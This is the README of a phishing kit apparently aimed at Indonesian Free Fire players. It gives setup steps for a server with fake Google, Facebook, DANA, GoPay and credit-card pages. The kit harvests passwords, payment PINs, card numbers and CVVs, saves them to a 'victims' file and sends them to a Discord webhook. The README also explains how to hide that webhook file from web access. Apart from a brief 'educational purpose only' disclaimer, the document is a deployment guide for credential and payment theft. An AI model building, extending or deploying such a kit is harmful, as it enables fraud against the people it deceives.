# FF Phishing Demo - Educational Purpose Only

⚠️ **WARNING: This is for educational purposes only. Do not use this for illegal activities.**

## Setup Instructions

### 1. Install Dependencies
```bash
npm install
```

### 2. Configure Discord Webhook
Edit `webhook.txt` dan masukkan Discord webhook URL kamu:
```
https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
```

Cara bikin Discord webhook:
1. Buka Discord Server Settings
2. Integrations → Webhooks → New Webhook
3. Copy webhook URL
4. Paste ke `webhook.txt`

### 3. Run Server
```bash
npm start
```

Server akan jalan di `http://localhost:3000`

## Features

✅ Landing page dengan promo diskon besar
✅ Fake Google login page
✅ Fake Facebook login page
✅ Fake DANA payment page
✅ Fake GoPay payment page
✅ Fake Credit Card form
✅ Data exfiltration ke Discord webhook
✅ Local storage di `data/victims.json`
✅ webhook.txt protected dari web access (405 Method Not Allowed)

## Flow

1. User pilih diamond package
2. Redirect ke checkout → pilih login Google/Facebook
3. User masukkan email + password → **CAPTURED**
4. Redirect ke payment methods
5. Pilih DANA/GoPay → input phone + PIN → **CAPTURED**
   ATAU
   Pilih Credit Card → input card details + PIN → **CAPTURED**
6. Redirect ke success page

## Data yang Dikumpulkan

### Google/Facebook Login:
- Email
- Password
- IP Address
- Timestamp

### DANA/GoPay:
- Phone/Email
- PIN (6 digit)
- IP Address
- Timestamp

### Credit Card:
- Card Number
- Expiry Date
- CVV
- PIN
- IP Address
- Timestamp

## File Structure

```
ff-phishing-demo/
├── public/
│   ├── css/style.css          # Clean modern styling
│   └── js/main.js             # Client-side logic
├── views/
│   ├── index.html             # Landing page
│   ├── checkout.html          # Checkout page
│   ├── login-google.html      # Fake Google login
│   ├── login-facebook.html    # Fake Facebook login
│   ├── payment-dana.html      # Fake DANA payment
│   ├── payment-gopay.html     # Fake GoPay payment
│   ├── payment-card.html      # Fake card payment
│   └── success.html           # Success page
├── routes/
│   └── harvest.js             # Data harvesting API
├── data/
│   └── victims.json           # Local storage
├── server.js                  # Express server
├── webhook.txt                # Discord webhook (PROTECTED)
├── package.json
└── .env
```

## Security Features

### webhook.txt Protection
File `webhook.txt` di-protect dari web access:
- GET → 405 Method Not Allowed
- POST → 405 Method Not Allowed
- HEAD → 405 Method Not Allowed

Hanya bisa diakses oleh server internally.

## Design

Style menggunakan:
- Clean white background (#FFFFFF / #F8F9FA)
- Minimalist card-based layout
- Smooth shadows & transitions
- Mobile responsive
- Professional typography
- Trust indicators

## Legal Disclaimer

⚠️ **EDUCATIONAL PURPOSE ONLY**

Phishing adalah ILLEGAL. Tool ini dibuat untuk:
- Educational purposes
- Security awareness training
- Understanding phishing techniques
- Local testing only

**DO NOT:**
- Deploy to public internet
- Use against real people
- Steal actual credentials
- Break any laws

**Gunakan hanya di localhost untuk belajar!**

## Author

Created by anos6501 (Philorganon)
GitHub: https://github.com/Philorganon

---

**Remember: With great power comes great responsibility. Use wisely.**
